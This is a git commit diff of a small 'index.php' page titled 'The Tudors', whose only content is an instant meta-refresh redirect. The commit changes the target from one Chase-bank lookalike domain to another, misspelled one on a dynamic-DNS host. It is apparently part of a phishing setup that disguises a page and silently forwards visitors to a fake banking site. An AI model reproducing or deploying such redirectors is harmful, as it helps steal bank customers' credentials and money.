51b7a258c8852584203a94c17b86c220141257bd
luqmjpro <73815937+luqmjpro@users.noreply.github.com>
2020-12-10 02:14:10 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">    
   <head>      
     <title>The Tudors</title>      
-    <meta http-equiv="refresh" content="0;URL='https://chaseonlinesecure.info/'" />    
+    <meta http-equiv="refresh" content="0;URL='https://chse0nlinescureinf0.giize.com/'" />    
   </head>    
   <body> 
   
